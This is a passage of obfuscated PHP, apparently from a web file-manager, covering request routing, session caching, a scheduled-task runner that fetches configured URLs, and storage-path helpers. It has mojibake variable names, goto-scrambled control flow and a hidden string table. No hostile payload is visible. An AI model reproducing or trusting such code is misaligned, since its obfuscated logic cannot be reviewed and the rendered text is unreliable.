end($BÑ¢ÂÑ˜“ç); $e¾İ­Àì¡¬ = explode($Eˆß÷‹¡ŒÙ[1386], $Cİåª‘ç); $EÆ¤Áâ¬‡ = new $e¾İ­Àì¡¬[0](); if (!method_exists($EÆ¤Áâ¬‡, $e¾İ­Àì¡¬[1])) { echo $Eˆß÷‹¡ŒÙ[1389]; } else { call_user_func_array(array($EÆ¤Áâ¬‡, $e¾İ­Àì¡¬[1]), $C‹Å…»„ãğ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Få–Û÷Ô’œ], $C‹Å…»„ãğ); if (self::$halts) { return; } } } } $Få–Û÷Ô’œ++; } } if ($Dˆ§±Ö¬ñ½ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $FèŠÖ¥Ô”´ =& $_SERVER[í…¶]; header($_SERVER[$FèŠÖ¥Ô”´[1390]] . $FèŠÖ¥Ô”´[1391]); echo $FèŠÖ¥Ô”´[1392]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Eˆß÷‹¡ŒÙ[1384]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto C†ê¦™¹ã; eÄÕ’¨õ‰¶: $dèˆ§Š±‡¿ = array_keys(static::$patterns); $Eá´¥°¥¤ = array_values(static::$patterns); $Dˆ§±Ö¬ñ½ = !1; goto C¼‚É”Ÿó½; C†ê¦™¹ã: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Cí¾ßù«ƒÏ; CØ»¹¼ŞÃ„: $E»¨ÛñË¾¦ = $CÌ±“ˆ¨×[$B©›ê¹‰ï[1395]]; $Fö‘‡®òÈò = $CÌ±“ˆ¨×[$E»¨ÛñË¾¦]; $Dõø³ßŞ¡„ = $CÌ±“ˆ¨×[$B©›ê¹‰ï[758]]; goto e¾‹®Şâá‰; e¾‹®Şâá‰: switch ($E»¨ÛñË¾¦) { case $B©›ê¹‰ï[17]: self::$handle = Model($B©›ê¹‰ï[759]); break; case $B©›ê¹‰ï[760]: self::$handle = new CacheRedis($Fö‘‡®òÈò, $Dõø³ßŞ¡„); break; case $B©›ê¹‰ï[761]: self::$handle = new CacheMemcached($Fö‘‡®òÈò, $Dõø³ßŞ¡„); break; case $B©›ê¹‰ï[167]: $Fö‘‡®òÈò[$B©›ê¹‰ï[75]] = $Fö‘‡®òÈò[$B©›ê¹‰ï[75]] . $B©›ê¹‰ï[1396]; self::$handle = new CacheFile($Fö‘‡®òÈò, $Dõø³ßŞ¡„); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $AôÓ–¥Ö—Á = new self(); goto b“Ì‘šá—§; B½Ô‘®Ï«†: $d´ê¤•˜å = _get($GLOBALS, $B©›ê¹‰ï[1394], $d´ê¤•˜å); if (self::$sessionSign) { } else { if (Cookie::get($d´ê¤•˜å)) { self::$sessionSign = Cookie::get($d´ê¤•˜å); } else { self::$sessionSign = guid(); } } Cookie::setSafe($d´ê¤•˜å, self::$sessionSign, self::$sessionTime); goto CØ»¹¼ŞÃ„; D½íãš«ƒ: $CÌ±“ˆ¨× = $GLOBALS[$B©›ê¹‰ï[6]][$B©›ê¹‰ï[337]]; self::$sessionTime = $CÌ±“ˆ¨×[$B©›ê¹‰ï[1393]]; $d´ê¤•˜å = SESSION_ID; goto B½Ô‘®Ï«†; b“Ì‘šá—§: return $AôÓ–¥Ö—Á; goto E•¦ÎßŞÀÄ; Cí¾ßù«ƒÏ: $B©›ê¹‰ï =& $_SERVER[í…¶]; static $AôÓ–¥Ö—Á = false; if ($AôÓ–¥Ö—Á) { return $AôÓ–¥Ö—Á; } goto D½íãš«ƒ; E•¦ÎßŞÀÄ: } public static function sign($a‹ÖìÈöÀË = false) { $a‹ÖìÈöÀË && (self::$sessionSign = $a‹ÖìÈöÀË); self::init(); return self::$sessionSign; } public static function set($FÊãÎ…‘ê‡, $eÍ‰ï£ôÉ = false) { self::init(); if (is_array($FÊãÎ…‘ê‡)) { foreach ($FÊãÎ…‘ê‡ as $dÄ®œİ¶øĞ => $c·º¡Õ°›†) { array_set_value(self::$data, $dÄ®œİ¶øĞ, $c·º¡Õ°›†); } } else { array_set_value(self::$data, $FÊãÎ…‘ê‡, $eÍ‰ï£ôÉ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($e˜‚é¢¬“í = false) { self::init(); if (!$e˜‚é¢¬“í) { return self::$data; } return array_get_value(self::$data, $e˜‚é¢¬“í); } public static function remove($E†Ü÷ƒ¿À’) { self::init(); unset(self::$data[$E†Ü÷ƒ¿À’]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[í…¶][763])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto eìÎã†Ïß°; dôÓëôÎ: http_close(); self::valueSet($B©à­öÛÁ[1397], $B©à­öÛÁ[83]); Hook::bind($B©à­öÛÁ[1399], $B©à­öÛÁ[1400]); goto eùÏè¸‰; eùÏè¸‰: while (!0) { self::cacheClear(); if (self::valueGet($B©à­öÛÁ[691]) != $B©à­öÛÁ[83]) { self::valueSet($B©à­öÛÁ[1397], $B©à­öÛÁ[477]); self::log($B©à­öÛÁ[1401]); die; } self::valueSet($B©à­öÛÁ[1397], $B©à­öÛÁ[83]); self::valueSet($B©à­öÛÁ[1398], time()); self::taskRunAll(); sleep(self::valueGet($B©à­öÛÁ[1402])); } goto a¤­×ğ…‹ï; eìÎã†Ïß°: $B©à­öÛÁ =& $_SERVER[í…¶]; if (self::valueGet($B©à­öÛÁ[691]) != $B©à­öÛÁ[83]) { return; } if (self::valueGet($B©à­öÛÁ[1397]) == $B©à­öÛÁ[83]) { $dµõ“Ìßòò = self::valueGet($B©à­öÛÁ[1398]); if (time() - $dµõ“Ìßòò > 3600 * 2) { self::restart(); } return; } goto dôÓëôÎ; a¤­×ğ…‹ï: } public static function restart() { $b™Ö¼ÓÅË =& $_SERVER[í…¶]; http_close(); self::valueSet($b™Ö¼ÓÅË[691], $b™Ö¼ÓÅË[477]); sleep(self::valueGet($b™Ö¼ÓÅË[1402]) + 5); self::valueSet($b™Ö¼ÓÅË[1397], $b™Ö¼ÓÅË[477]); self::valueSet($b™Ö¼ÓÅË[691], $b™Ö¼ÓÅË[83]); } public static function shutdownEvent() { $dí¦¾Ë†Ş =& $_SERVER[í…¶]; self::valueSet($dí¦¾Ë†Ş[1397], $dí¦¾Ë†Ş[477]); self::log($dí¦¾Ë†Ş[1403]); } public static function config($EÎÔºÕ˜ëò, $cĞ ¾’±Åà) { $E±“¿Ö¤ ï =& $_SERVER[í…¶]; $AÎ×²˜“ñ = 20; $cĞ ¾’±Åà = intval($cĞ ¾’±Åà) <= $AÎ×²˜“ñ ? $AÎ×²˜“ñ : intval($cĞ ¾’±Åà); self::valueSet($E±“¿Ö¤ ï[691], $EÎÔºÕ˜ëò); self::valueSet($E±“¿Ö¤ ï[1402], $cĞ ¾’±Åà); } private static function taskRunAll() { $A¾´ìá®²õ =& $_SERVER[í…¶]; $a‹èÔÜ²‘¹ = Model($A¾´ìá®²õ[1404])->listData(); $C×¼®İ·Ö° = count($a‹èÔÜ²‘¹); for ($b»º——¢¨œ = 0; $b»º——¢¨œ < $C×¼®İ·Ö°; $b»º——¢¨œ++) { $dÕñ³òÎÖÆ = $a‹èÔÜ²‘¹[$b»º——¢¨œ]; if ($dÕñ³òÎÖÆ[$A¾´ìá®²õ[1405]] != $A¾´ìá®²õ[83]) { continue; } if (!self::taskTimeCheck($dÕñ³òÎÖÆ)) { continue; } self::taskRun($dÕñ³òÎÖÆ); } Hook::trigger($A¾´ìá®²õ[1406]); } private static function taskTimeCheck($a§¸ø«Æ‹) { goto d¦œ™ÎŞ’ö; cš¤Îàí«: $A¹½Ú²‚àÇ = strtotime($e£Ò«Å‡Ëâ[1407] . $bÌ¤±ˆîáˆ[$e£Ò«Å‡Ëâ[1408]] . $e£Ò«Å‡Ëâ[1409]) - strtotime($e£Ò«Å‡Ëâ[1410]); $fµÄœÜ„ò• = time() - strtotime(date($e£Ò«Å‡Ëâ[1411]) . $e£Ò«Å‡Ëâ[1412]); $a¹Â±–‹¢ = $fµÄœÜ„ò• >= $A¹½Ú²‚àÇ && $fµÄœÜ„ò• <= $A¹½Ú²‚àÇ + 3600; goto Bµ‘œÜ¾ù; Bµ‘œÜ¾ù: switch ($bÌ¤±ˆîáˆ[$e£Ò«Å‡Ëâ[29]]) { case $e£Ò«Å‡Ëâ[1413]: if (time() - $f¢Ä¬ˆ¶‚ < 3600 * 24 * 30) { return !1; } if ($bÌ¤±ˆîáˆ[$e£Ò«Å‡Ëâ[1413]] == date($e£Ò«Å‡Ëâ[1414]) && $a¹Â±–‹¢) { return !0; } break; case $e£Ò«Å‡Ëâ[1415]: if (time() - $f¢Ä¬ˆ¶‚ < 3600 * 24 * 7) { return !1; } $B¤±ˆÅİÉ = date($e£Ò«Å‡Ëâ[1416]) == 0 ? 7 : date($e£Ò«Å‡Ëâ[1416]); if ($bÌ¤±ˆîáˆ[$e£Ò«Å‡Ëâ[1415]] == $B¤±ˆÅİÉ && $a¹Â±–‹¢) { return !0; } break; case $e£Ò«Å‡Ëâ[1408]: if (time() - $f¢Ä¬ˆ¶‚ < 3600 * 24) { return !1; } if ($a¹Â±–‹¢) { return !0; } break; case $e£Ò«Å‡Ëâ[1417]: if (time() - $f¢Ä¬ˆ¶‚ >= floatval($bÌ¤±ˆîáˆ[$e£Ò«Å‡Ëâ[1417]]) * 60) { return !0; } break; default: break; } return !1; goto f›‘ÈŠ¾÷ì; d¦œ™ÎŞ’ö: $e£Ò«Å‡Ëâ =& $_SERVER[í…¶]; $bÌ¤±ˆîáˆ = json_decode($a§¸ø«Æ‹[$e£Ò«Å‡Ëâ[190]], !0); $f¢Ä¬ˆ¶‚ = intval($a§¸ø«Æ‹[$e£Ò«Å‡Ëâ[1398]]); goto cš¤Îàí«; f›‘ÈŠ¾÷ì: } public static function taskRun($aÀ—õ¬åÊá) { goto böºŸˆ¨˜÷; böºŸˆ¨˜÷: $açØ“ËâœÑ =& $_SERVER[í…¶]; self::log($açØ“ËâœÑ[1418] . $aÀ—õ¬åÊá[$açØ“ËâœÑ[376]] . $açØ“ËâœÑ[1419] . $aÀ—õ¬åÊá[$açØ“ËâœÑ[28]] . $açØ“ËâœÑ[1420] . $aÀ—õ¬åÊá[$açØ“ËâœÑ[1421]]); Model($açØ“ËâœÑ[1404])->run($aÀ—õ¬åÊá[$açØ“ËâœÑ[376]]); goto FÇøÔóéŞ; c†Òê±Œİ: Model($açØ“ËâœÑ[1422])->add(array($açØ“ËâœÑ[1423] => $açØ“ËâœÑ[33], $açØ“ËâœÑ[1424] => $açØ“ËâœÑ[477], $açØ“ËâœÑ[29] => $açØ“ËâœÑ[1425] . $aÀ—õ¬åÊá[$açØ“ËâœÑ[376]], $açØ“ËâœÑ[1426] => json_encode(array($açØ“ËâœÑ[28] => $aÀ—õ¬åÊá[$açØ“ËâœÑ[28]], $açØ“ËâœÑ[1427] => timeFloat() - $a”ÎƒŒ”›ã, $açØ“ËâœÑ[281] => $E¤ìè¢²)))); self::log($açØ“ËâœÑ[1428] . $aÀ—õ¬åÊá[$açØ“ËâœÑ[376]] . $açØ“ËâœÑ[1429] . $E¤ìè¢²); return !0; goto f»´›‡š; FÇøÔóéŞ: $a”ÎƒŒ”›ã = timeFloat(); $E¤ìè¢² = $açØ“ËâœÑ[33]; switch ($aÀ—õ¬åÊá[$açØ“ËâœÑ[29]]) { case $açØ“ËâœÑ[295]: $E‹´–æ«Ñ­ = url_request($aÀ—õ¬åÊá[$açØ“ËâœÑ[1421]], $açØ“ËâœÑ[216], !1, !1, !1, !1, 5); $E¤ìè¢² = strlen($E‹´–æ«Ñ­); break; case $açØ“ËâœÑ[215]: $E¤ìè¢² = Hook::apply($aÀ—õ¬åÊá[$açØ“ËâœÑ[1421]]); default: break; } goto c†Òê±Œİ; f»´›‡š: } private static function valueGet($e·Ôèá¯Õ¶) { $fŸôáäêÚ¿ =& $_SERVER[í…¶]; $FÉÀ¨ô‰¥» = $fŸôáäêÚ¿[1430]; $fµ‡’õË±÷ = Model($fŸôáäêÚ¿[1431])->get($e·Ôèá¯Õ¶, $FÉÀ¨ô‰¥»); if (is_null($fµ‡’õË±÷)) { Model($fŸôáäêÚ¿[1431])->set($fŸôáäêÚ¿[1402], 10, $FÉÀ¨ô‰¥»); Model($fŸôáäêÚ¿[1431])->set($fŸôáäêÚ¿[691], $fŸôáäêÚ¿[83], $FÉÀ¨ô‰¥»); Model($fŸôáäêÚ¿[1431])->set($fŸôáäêÚ¿[1397], $fŸôáäêÚ¿[477], $FÉÀ¨ô‰¥»); $fµ‡’õË±÷ = Model($fŸôáäêÚ¿[1431])->get($e·Ôèá¯Õ¶, $FÉÀ¨ô‰¥»); } return $fµ‡’õË±÷; } private static function valueSet($cæŠ»¦¿³, $d¨®ô™º¯) { $Cª£¯ùä‡Ş =& $_SERVER[í…¶]; return Model($Cª£¯ùä‡Ş[1431])->set($cæŠ»¦¿³, $d¨®ô™º¯, $Cª£¯ùä‡Ş[1430]); } protected static function log($D…´¢…î»¹) { write_log($D…´¢…î»¹, $_SERVER[í…¶][1432]); } private static function cacheClear() { $d²µ÷Ò—Ü› =& $_SERVER[í…¶]; $A›ÏÁæ½½Ú = Model($d²µ÷Ò—Ü›[1431])->cacheKey($d²µ÷Ò—Ü›[1430]); Cache::clearMemory($A›ÏÁæ½½Ú); } } goto BãºŞØ°Ó; dªæèâ•»: function beforeShutdown() { Hook::trigger($_SERVER[²‡§™ıäÑÊº•][36]); } $_SERVER[$_SERVER[²‡§™ıäÑÊº•][37]] = BASIC_PATH; $_SERVER[$_SERVER[²‡§™ıäÑÊº•][38]] = LIB_DIR; goto eïŒñ…­·ö; aµØ˜“»àä: class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\x65\x72\122\145\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\x46\x69\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\x6c\145\x54\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\x52\x6f\x6f\164\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\123\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\x53\150\141\x72\145\x4c\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\x65\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\x49\x74\145\x6d\114\x69\x6e\153\175"; const KOD_SEARCH = "\173\163\145\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\143\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\x72\x52\145\156\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\173\x64\162\x69\166\x65\x72\x7d"; public static function typeList() { $dÇòÊŒº•… =& $_SERVER[í…¶]; return array($dÇòÊŒº•…[1048] => self::KOD_SOURCE, $dÇòÊŒº•…[1049] => self::KOD_USER_RECYCLE, $dÇòÊŒº•…[1050] => self::KOD_USER_FAV, $dÇòÊŒº•…[1051] => self::KOD_USER_FILE_TAG, $dÇòÊŒº•…[1052] => self::KOD_USER_FILE_TYPE, $dÇòÊŒº•…[1053] => self::KOD_GROUP_ROOT_SELF, $dÇòÊŒº•…[1054] => self::KOD_USER_SHARE, $dÇòÊŒº•…[1055] => self::KOD_USER_SHARE_LINK, $dÇòÊŒº•…[1056] => self::KOD_USER_SHARE_TO_ME, $dÇòÊŒº•…[1057] => self::KOD_SHARE_ITEM, $dÇòÊŒº•…[1058] => self::KOD_SHARE_LINK, $dÇòÊŒº•…[1059] => self::KOD_SEARCH, $dÇòÊŒº•…[1060] => self::KOD_BLOCK, $dÇòÊŒº•…[1061] => self::KOD_IO, $dÇòÊŒº•…[1062] => self::KOD_USER_RECENT, $dÇòÊŒº•…[1063] => self::KOD_USER_DRIVER); } public static function parse($C…»Áº¤Û) { goto cò´ª®öé½; cò´ª®öé½: $aİ¶‰ÜÒíÚ =& $_SERVER[í…¶]; $C…»Áº¤Û = self::clear($C…»Áº¤Û); $Dö‘è æÚ = array_values(self::typeList()); goto C¡•Š¡Û·È; C¡•Š¡Û·È: preg_match($aİ¶‰ÜÒíÚ[1064], $C…»Áº¤Û, $A²†ˆ´é×‘); $c˜øé¼›¯– = array($aİ¶‰ÜÒíÚ[397] => !1, $aİ¶‰ÜÒíÚ[1065] => !1, $aİ¶‰ÜÒíÚ[394] => !1, $aİ¶‰ÜÒíÚ[75] => $C…»Áº¤Û, $aİ¶‰ÜÒíÚ[1011] => !1, $aİ¶‰ÜÒíÚ[1010] => $aİ¶‰ÜÒíÚ[33]); if (is_array($A²†ˆ´é×‘) && count($A²†ˆ´é×‘) == 5) { $DĞà‘•ˆÔÒ = $aİ¶‰ÜÒíÚ[1066] . $A²†ˆ´é×‘[2] . $aİ¶‰ÜÒíÚ[315]; if (in_array($DĞà‘•ˆÔÒ, $Dö‘è æÚ)) { $c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[1011]] = $A²†ˆ´é×‘[1]; $c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[29]] = $DĞà‘•ˆÔÒ; $c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[1067]] = substr($DĞà‘•ˆÔÒ, 1, -1); $c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[376]] = $A²†ˆ´é×‘[3]; } $c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[1010]] = $A²†ˆ´é×‘[4]; } goto AÌÂ“Õˆ„·; AÌÂ“Õˆ„·: $b­ÊÔëÌ‡­ = array($aİ¶‰ÜÒíÚ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[1068]] = in_array($c˜øé¼›¯–[$aİ¶‰ÜÒíÚ[29]], $b­ÊÔëÌ‡­); return $c˜øé¼›¯–; goto EóÚ˜¶¬Î; EóÚ˜¶¬Î: } public static function clear($AÌõë…ø’Ä) { goto fÈö †; fÈö †: $c®±¡£¦ëô =& $_SERVER[í…¶]; $AÌõë…ø’Ä = str_replace(array($c®±¡£¦ëô[990], $c®±¡£¦ëô[217]), $c®±¡£¦ëô[50], $AÌõë…ø’Ä); $AÌõë…ø’Ä = str_replace($c®±¡£¦ëô[93], $c®±¡£¦ëô[8], $AÌõë…ø’Ä); goto BôÕ³ÀäíÈ; B¨áæ‰³ĞÕ: return $AÌõë…ø’Ä; goto EÔ¤º‡—É; BôÕ³ÀäíÈ: $aê”–·ĞÕ‘ = $c®±¡£¦ëô[1069]; if (substr($AÌõë…ø’Ä, 0, 3) == $c®±¡£¦ëô[1070]) { $AÌõë…ø’Ä = substr($AÌõë…ø’Ä, 3); } while (strstr($AÌõë…ø’Ä, $aê”–·ĞÕ‘)) { $AÌõë…ø’Ä = str_replace($aê”–·ĞÕ‘, $c®±¡£¦ëô[8], $AÌõë…ø’Ä); } goto AÏ„ŠÈĞÄî; AÏ„ŠÈĞÄî: $AÌõë…ø’Ä = preg_replace($c®±¡£¦ëô[1071], $c®±¡£¦ëô[8], $AÌõë…ø’Ä); if ($AÌõë…ø’Ä == $c®±¡£¦ëô[8]) { return $c®±¡£¦ëô[8]; } $AÌõë…ø’Ä = rtrim($AÌõë…ø’Ä, $c®±¡£¦ëô[8]); goto B¨áæ‰³ĞÕ; EÔ¤º‡—É: } public static function sourceID($a¬‡ÎöÅ¬) { $aê°óöŞœÌ =& $_SERVER[í…¶]; $dª±ˆİ†•í = self::parse($a¬‡ÎöÅ¬); if ($dª±ˆİ†•í[$aê°óöŞœÌ[29]] !== self::KOD_SOURCE) { show_json(LNG($aê°óöŞœÌ[1072]), !1); } return $dª±ˆİ†•í[$aê°óöŞœÌ[376]]; } public static function make($cã²½Ğ¤Áï) { if (!$cã²½Ğ¤Áï) { return !1; } return self::makePath(self::KOD_SOURCE, intval($cã²½Ğ¤Áï)); } public static function makeShare($Fµî²¬Ì ­, $E¢Õï–Á¸«) { return self::makePath(self::KOD_SHARE_ITEM, $Fµî²¬Ì ­, $E¢Õï–Á¸«); } public static function makeFileTypePath($BçœÑƒ”¹¦) { return self::makePath(self::KOD_USER_FILE_TYPE, $BçœÑƒ”¹¦); } public static function makeFileTagPath($eÚÚ´—ôˆ¿) { return self::makePath(self::KOD_USER_FILE_TAG, $eÚÚ´—ôˆ¿); } public static function makePath($e†ãÕ´ÑÊŞ, $aç¦Ç¦µÛé = '', $F¶ØÏÃ™Úä = '') { $fš¨‹ÊÅ©å =& $_SERVER[í…¶]; $F’ƒëÚ­£˜ = substr($e†ãÕ´ÑÊŞ, 1, -1); $BÒØ´ò¦’ = $fš¨‹ÊÅ©å[1073] . $F’ƒëÚ­£˜ . $fš¨‹ÊÅ©å[1074] . $aç¦Ç¦µÛé . $fš¨‹ÊÅ©å[1075]; $BÒØ´ò¦’ = $F¶ØÏÃ™Úä ? $BÒØ´ò¦’ . $F¶ØÏÃ™Úä . $fš¨‹ÊÅ©å[8] : $BÒØ´ò¦’; return $BÒØ´ò¦’; } public static function hashPath($c†¿ä‡¹’Å) { $bÍÒª»Çâá =& $_SERVER[í…¶]; $dÀ²Ó„©Ã = is_array($c†¿ä‡¹’Å) ? $c†¿ä‡¹’Å : IO::info($c†¿ä‡¹’Å); $e§‹Ø¾Ô = _get($dÀ²Ó„©Ã, $bÍÒª»Çâá[1076], $bÍÒª»Çâá[33]); if (!$e§‹Ø¾Ô) { $B—ƒô”Û©‚ = KodIO::parse($dÀ²Ó„©Ã[$bÍÒª»Çâá[75]]); if (!$B—ƒô”Û©‚[$bÍÒª»Çâá[29]]) { $e§‹Ø¾Ô = IO::hashSimple($dÀ²Ó„©Ã[$bÍÒª»Çâá[75]]); } } if (!$e§‹Ø¾Ô) { $e§‹Ø¾Ô = md5($dÀ²Ó„©Ã[$bÍÒª»Çâá[75]] . $dÀ²Ó„©Ã[$bÍÒª»Çâá[77]] . $dÀ²Ó„©Ã[$bÍÒª»Çâá[107]]); } return $e§‹Ø¾Ô; } public static function initSystemPath() { $DĞ¡¢ß÷Üˆ =& $_SERVER[í…¶]; if (defined($DĞ¡¢ß÷Üˆ[1077])) { return; } define($DĞ¡¢ß÷Üˆ[1077], self::systemPath($DĞ¡¢ß÷Üˆ[1078])); define($DĞ¡¢ß÷Üˆ[1079], self::systemPath($DĞ¡¢ß÷Üˆ[1080])); define($DĞ¡¢ß÷Üˆ[1081], self::systemPath($DĞ¡¢ß÷Üˆ[1082])); define($DĞ¡¢ß÷Üˆ[1083], self::systemPath($DĞ¡¢ß÷Üˆ[1084])); } private static function systemPath($FÜ×õÔç™ß) { goto a„ö¾‡¨¬; aÃä·½Ú›Ì: return $døê”ÁŒ†; goto F„Óâæ›…‚; aî¬¯¹¤®‰: if ($døê”ÁŒ†) { return $døê”ÁŒ†; } if ($FÜ×õÔç™ß == $Fë·ˆÑ­ø…[1078]) { $døê”ÁŒ† = self::make(Model($Fë·ˆÑ­ø…[755])->systemRootPathAdd($Fë·ˆÑ­ø…[1087])); } else { $døê”ÁŒ† = self::systemPath($Fë·ˆÑ­ø…[1078]); $aÅšààÅ = self::sourceID($døê”ÁŒ†); $døê”ÁŒ† = self::make(Model($Fë·ˆÑ­ø…[755])->mkdir($aÅšààÅ, $FÜ×õÔç™ß)); } Model($Fë·ˆÑ­ø…[1086])->set($F‚Á˜“ïéÚ, $døê”ÁŒ†); goto aÃä·½Ú›Ì; a„ö¾‡¨¬: $Fë·ˆÑ­ø… =& $_SERVER[í…¶]; $F‚Á˜“ïéÚ = $Fë·ˆÑ­ø…[1085] . ucfirst($FÜ×õÔç™ß); $døê”ÁŒ† = Model($Fë·ˆÑ­ø…[1086])->get($F‚Á˜“ïéÚ); goto aî¬¯¹¤®‰; F„Óâæ›…‚: } public static function systemFolder($C¡’õªãÑÛ) { $a‡Ê‚¸ÁÓ = IO_PATH_SYSTEM_SOURCE . $C¡’õªãÑÛ; $E¤²ŞëãÓß = Cache::get($a‡Ê‚¸ÁÓ); if (!$E¤²ŞëãÓß) { $D†¸ãÛ¶ƒÉ = IO::infoFull($a‡Ê‚¸ÁÓ); if (!$D†¸ãÛ¶ƒÉ) { $E¤²ŞëãÓß = IO::mkdir($a‡Ê‚¸ÁÓ, REPEAT_SKIP); } else { $E¤²ŞëãÓß = $D†¸ãÛ¶ƒÉ[$_SERVER[í…¶][75]]; } Cache::set($a‡Ê‚¸ÁÓ, $E¤²ŞëãÓß, 3600 * 10); } return $E¤²ŞëãÓß; } public static function defaultDriver() { return Model($_SERVER[í…¶][706])->defaultDriver(); } public static function defaultIO() { $a•¬¦êƒÛ =& $_SERVER[í…¶]; $bšÅ‘•ìø× = self::defaultDriver(); return $a•¬¦êƒÛ[1088] . $bšÅ‘•ìø×[$a•¬¦êƒÛ[376]] . $a•¬¦êƒÛ[1075]; } public static function defaultDriverInit() { static $cºº‰ÓÃ = false; if ($cºº‰ÓÃ) { return $cºº‰ÓÃ; } $cºº‰ÓÃ = IO::init(self::defaultIO()); return $cºº‰ÓÃ; } public static function fileTypeList() { $DÍ¦‰®¥×Á =& $_SERVER[í…¶]; $EÏÇ‰èšÆÛ = $GLOBALS[$DÍ¦‰®¥×Á[6]][$DÍ¦‰®¥×Á[1089]]; foreach ($EÏÇ‰èšÆÛ as $F¼±ÃæŒ => $d’¡¾‰‰„í) { $d˜â˜º´…ï = $DÍ¦‰®¥×Á[1090] . $F¼±ÃæŒ; $F¿Ü¥Î¥©‚ = LNG($d˜â˜º´…ï); if ($d˜â˜º´…ï != $F¿Ü¥Î¥©‚) { $EÏÇ‰èšÆÛ[$F¼±ÃæŒ][$DÍ¦‰®¥×Á[28]] = $F¿Ü¥Î¥©‚; } } return $EÏÇ‰èšÆÛ; } public static function transferType($b’×Ø´»¯ , $B‹…›°Ïõ) { goto AÎİìÏŸŒ¾; dÖØíÕœ™¶: return $f»Æ‡©¾Ï¥[1093]; goto FÒ—¸ò‘; AÎİìÏŸŒ¾: $f»Æ‡©¾Ï¥ =& $_SERVER[í…¶]; $Bí¥†­¢« = self::driverType($b’×Ø´»¯ ); $F¹¼ºØµø = self::driverType($B‹…›°Ïõ); goto fäåªà„¹; fäåªà„¹: if ($Bí¥†­¢«[$f»Æ‡©¾Ï¥[29]] == $F¹¼ºØµø[$f»Æ‡©¾Ï¥[29]] && $Bí¥†­¢«[$f»Æ‡©¾Ï¥[1091]] == $F¹¼ºØµø[$f»Æ‡©¾Ï¥[1091]]) { return $f»Æ‡©¾Ï¥[1092]; } if ($Bí¥†­¢«[$f»Æ‡©¾Ï¥[29]] == $f»Æ‡©¾Ï¥[782] && $F¹¼ºØµø[$f»Æ‡©¾Ï¥[29]] == $f»Æ‡©¾Ï¥[102]) { return $f»Æ‡©¾Ï¥[1038]; } if ($Bí¥†­¢«[$f»Æ‡©¾Ï¥[29]] == $f»Æ‡©¾Ï¥[102] && $F¹¼ºØµø[$f»Æ‡©¾Ï¥[29]] == $f»Æ‡©¾Ï¥[782]) { return $f»Æ‡©¾Ï¥[103]; } goto dÖØíÕœ™¶; FÒ—¸ò‘: } public static function driverType($eàî‚æ®“†) { goto fŠÌˆ³ˆ¼; CÜ¶ƒø÷ÒĞ: if ($Fµµ¤ÏŒÃ == $bŞöÔË‚·Š[696] || $Fµµ¤ÏŒÃ == $bŞöÔË‚·Š[1095] || $Fµµ¤ÏŒÃ == $bŞöÔË‚·Š[1096]) { $eàî‚æ®“† = self::defaultDriverInit(); } else { if ($Fµµ¤ÏŒÃ == $bŞöÔË‚·Š[1046] || $Fµµ¤ÏŒÃ == $bŞöÔË‚·Š[1097]) { $eàî‚æ®“† = IO::init($eàî‚æ®“†->pathParse[$bŞöÔË‚·Š[996]]); } } $Fµµ¤ÏŒÃ = str_replace($bŞöÔË‚·Š[1094], $bŞöÔË‚·Š[33], strtolower($eàî‚æ®“†->getType())); if ($Fµµ¤ÏŒÃ == $bŞöÔË‚·Š[102]) { return array($bŞöÔË‚·Š[29] => $bŞöÔË‚·Š[102], $bŞöÔË‚·Š[1091] => $bŞöÔË‚·Š[33], $bŞöÔË‚·Š[75] => $e¯äç–÷ƒ‰); } goto CÒµ‹”‚•Ï; CÒµ‹”‚•Ï: return array($bŞöÔË‚·Š[29] => $bŞöÔË‚·Š[782], $bŞöÔË‚·Š[1091] => $eàî‚æ®“†->pathDriver, $bŞöÔË‚·Š[75] => $e¯äç–÷ƒ‰); goto b°õì¾„ë; fŠÌˆ³ˆ¼: $bŞöÔË‚·Š =& $_SERVER[í…¶]; $e¯äç–÷ƒ‰ = $eàî‚æ®“†->path; $Fµµ¤ÏŒÃ = 